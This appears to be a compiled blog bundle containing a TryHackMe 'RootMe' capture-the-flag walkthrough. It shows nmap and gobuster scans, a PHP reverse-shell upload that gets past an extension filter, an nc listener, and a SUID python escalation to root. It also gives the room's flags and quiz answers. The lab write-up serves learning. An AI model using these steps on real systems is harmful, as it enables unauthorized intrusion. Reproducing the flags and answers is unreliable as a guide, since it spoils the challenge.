"use strict";(globalThis.webpackChunkmy_own_blog=globalThis.webpackChunkmy_own_blog||[]).push([[7418],{90071(e,n,r){r.r(n),r.d(n,{assets:()=>l,contentTitle:()=>c,default:()=>h,frontMatter:()=>o,metadata:()=>s,toc:()=>d});const s=JSON.parse('{"id":"try-hack-me/rootme/rootme","title":"RootMe","description":"- Description: A ctf for beginners, can you root me?","source":"@site/docs/try-hack-me/rootme/rootme.mdx","sourceDirName":"try-hack-me/rootme","slug":"/try-hack-me/rootme/","permalink":"/docs/try-hack-me/rootme/","draft":false,"unlisted":false,"tags":[{"inline":false,"label":"Web","permalink":"/docs/tags/web","description":"Includes write-ups on the topic of Web"},{"inline":false,"label":"Linux","permalink":"/docs/tags/linux","description":"Includes write-ups on the topic of Linux"}],"version":"current","frontMatter":{"tags":["web","linux"]},"sidebar":"writeupsSidebar","previous":{"title":"Pickle Rick","permalink":"/docs/try-hack-me/pickle-rick/"},"next":{"title":"Cyber Defenders","permalink":"/docs/category/cyber-defenders"}}');var t=r(74848),i=r(28453);const o={tags:["web","linux"]},c="RootMe",l={},d=[{value:"\ud83d\udd0e Solution",id:"-solution",level:2},{value:"\u270f\ufe0f Answer questions",id:"\ufe0f-answer-questions",level:2},{value:"\ud83d\udea9Flag",id:"flag",level:2}];function a(e){const n={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,i.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.header,{children:(0,t.jsx)(n.h1,{id:"rootme",children:"RootMe"})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Description:"})," A ctf for beginners, can you root me?"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Difficulty:"})," Easy"]}),"\n"]}),"\n",(0,t.jsx)(n.hr,{}),"\n",(0,t.jsx)(n.h2,{id:"-solution",children:"\ud83d\udd0e Solution"}),"\n",(0,t.jsx)(n.p,{children:"With the target IP identified, the first step was scanning it using Nmap:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"> nmap -p- -sV --min-rate 5000 10.49.177.89\r\nPORT   STATE SERVICE VERSION\r\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)\r\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\r\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,t.jsxs)(n.p,{children:["Two open ports were discovered: SSH on port 22 and Apache HTTP service on port 80.\r\nNavigating to ",(0,t.jsx)(n.code,{children:"http://<IP-address>:80/"})," opened the main webpage."]}),"\n",(0,t.jsx)("div",{style:{width:"100%",margin:"0 auto"},children:(0,t.jsx)("img",{src:r(48159).A,style:{width:"100%",height:"auto"}})}),"\n",(0,t.jsxs)(n.p,{children:["Since the service was web-based, I used ",(0,t.jsx)(n.code,{children:"gobuster"})," to enumerate directories and look for interesting paths.\r\nThe scan revealed several:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"> gobuster dir -u http://10.49.177.89:80/ -w /usr/share/wordlists/dirb/common.txt\r\n===============================================================\r\nGobuster v3.8\r\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\r\n===============================================================\r\n[+] Url:                     http://10.49.177.89:80/\r\n[+] Method:                  GET\r\n[+] Threads:                 10\r\n[+] Wordlist:                /usr/share/wordlists/dirb/common.txt\r\n[+] Negative Status codes:   404\r\n[+] User Agent:              gobuster/3.8\r\n[+] Timeout:                 10s\r\n===============================================================\r\nStarting gobuster in directory enumeration mode\r\n===============================================================\r\n/.hta                 (Status: 403) [Size: 277]\r\n/.htaccess            (Status: 403) [Size: 277]\r\n/.htpasswd            (Status: 403) [Size: 277]\r\n/css                  (Status: 301) [Size: 310] [--\x3e http://10.49.177.89/css/]\r\n/index.php            (Status: 200) [Size: 616]\r\n/js                   (Status: 301) [Size: 309] [--\x3e http://10.49.177.89/js/]\r\n/panel                (Status: 301) [Size: 312] [--\x3e http://10.49.177.89/panel/]\r\n/server-status        (Status: 403) [Size: 277]\r\n/uploads              (Status: 301) [Size: 314] [--\x3e http://10.49.177.89/uploads/]\r\nProgress: 4613 / 4613 (100.00%)\r\n===============================================================\r\nFinished\r\n===============================================================\n"})}),"\n",(0,t.jsxs)(n.p,{children:["The ",(0,t.jsx)(n.code,{children:"/panel"})," route exposed a file upload function."]}),"\n",(0,t.jsx)("div",{style:{width:"100%",margin:"0 auto"},children:(0,t.jsx)("img",{src:r(98337).A,style:{width:"100%",height:"auto"}})}),"\n",(0,t.jsxs)(n.p,{children:["Since the web application was running PHP, I attempted to upload a PHP reverse shell (",(0,t.jsx)(n.a,{href:"https://github.com/pentestmonkey/php-reverse-shell",children:"Pentestmonkey's script"}),").\r\nThe payload was modified to use my machine's IP, then uploaded through the panel.\r\nThe server blocked ",(0,t.jsx)(n.code,{children:".php"})," extensions, so I renamed the file to a bypass extension such as ",(0,t.jsx)(n.code,{children:".php5"})," or ",(0,t.jsx)(n.code,{children:".phtml"}),"."]}),"\n",(0,t.jsx)(n.p,{children:"Before triggering the payload, I started a listener:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"nc -lvnp 1234\n"})}),"\n",(0,t.jsxs)(n.p,{children:["Once uploaded, I browsed to ",(0,t.jsx)(n.code,{children:"/uploads"})," to execute the file.\r\nThe listener received a connection, and a shell was obtained:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"> nc -lvnp 1234\r\nlistening on [any] 1234 ...\r\nconnect to [192.168.141.43] from (UNKNOWN) [10.64.139.176] 34878\r\nLinux ip-10-64-139-176 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux\r\n 04:10:17 up 1 min,  0 users,  load average: 0.50, 0.23, 0.09\r\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\r\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\r\n/bin/sh: 0: can't access tty; job control turned off\r\n$ whoami\r\nwww-data \n"})}),"\n",(0,t.jsx)(n.p,{children:"With the foothold established, I checked for readable files and quickly located the user flag:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"bash-5.0$ cat /var/www/user.txt\r\ncat /var/www/user.txt\r\nTHM{y0u_g0t_a_sh3ll}\n"})}),"\n",(0,t.jsxs)(n.p,{children:["Since the shell was running under the ",(0,t.jsx)(n.code,{children:"www-data"})," user, privilege escalation was required.\r\nA common path is abusing SUID binaries. I searched for them with:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-js",children:"bash-5.0$ find / -user root -perm /4000 2>/dev/null\r\nfind / -user root -perm /4000 2>/dev/null\r\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\r\n/usr/lib/snapd/snap-confine\r\n/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic\r\n/usr/lib/eject/dmcrypt-get-device\r\n/usr/lib/openssh/ssh-keysign\r\n/usr/lib/policykit-1/polkit-agent-helper-1\r\n/usr/bin/newuidmap\r\n/usr/bin/newgidmap\r\n/usr.bin/chsh\r\n//highlight-next-line\r\n/usr/bin/python2.7\r\n/usr.bin/chfn\r\n/usr.bin/gpasswd\r\n/usr.bin/sudo\r\n/usr.bin/newgrp\r\n/usr.bin/passwd\r\n/usr.bin/pkexec\r\n...\n"})}),"\n",(0,t.jsxs)(n.p,{children:["The presence of a SUID-enabled ",(0,t.jsx)(n.code,{children:"python2.7"})," binary made privilege escalation straightforward.\r\nReferencing payloads from ",(0,t.jsx)(n.a,{href:"https://gtfobins.github.io/gtfobins/python/#suid",children:"GTFOBins"}),", I executed:"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:'bash-5.0$ python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'\r\npython -c \'import os; os.execl("/bin/sh", "sh", "-p")\'\n'})}),"\n",(0,t.jsx)(n.p,{children:"That escalated the shell to root:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"# whoami\r\nwhoami\r\nroot\n"})}),"\n",(0,t.jsx)(n.p,{children:"Finally, the root flag was retrieved:"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{children:"# cat /root/root.txt\r\ncat /root/root.txt\r\nTHM{pr1v1l3g3_3sc4l4t10n}\n"})}),"\n",(0,t.jsx)(n.h2,{id:"\ufe0f-answer-questions",children:"\u270f\ufe0f Answer questions"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"Scan the machine, how many ports are open?"})}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"2"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"What version of Apache is running?"})}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"2.4.41"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"What service is running on port 22?"})}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"SSH"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"What is the hidden directory?"})}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"/panel/"}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"Search for files with SUID permission, which file is weird?"})}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:"/usr/bin/python"}),"\n"]}),"\n",(0,t.jsx)(n.h2,{id:"flag",children:"\ud83d\udea9Flag"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"User flag:"})}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.code,{children:"THM{y0u_g0t_a_sh3ll}"})}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"Root flag:"})}),"\n",(0,t.jsxs)(n.blockquote,{children:["\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.code,{children:"THM{pr1v1l3g3_3sc4l4t10n}"})}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(a,{...e})}):a(e)}},48159(e,n,r){r.d(n,{A:()=>s});const s=r.p+"assets/images/dash-6a860d64da38a5ece99fcbece0c5ef83.png"},98337(e,n,r){r.d(n,{A:()=>s});const s=r.p+"assets/images/panel-bc197b3320a05f00cab2c7c78b1b2c17.png"},28453(e,n,r){r.d(n,{R:()=>o,x:()=>c});var s=r(96540);const t={},i=s.createContext(t);function o(e){const n=s.useContext(i);return s.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:o(e.components),s.createElement(i.Provider,{value:n},e.children)}}}]);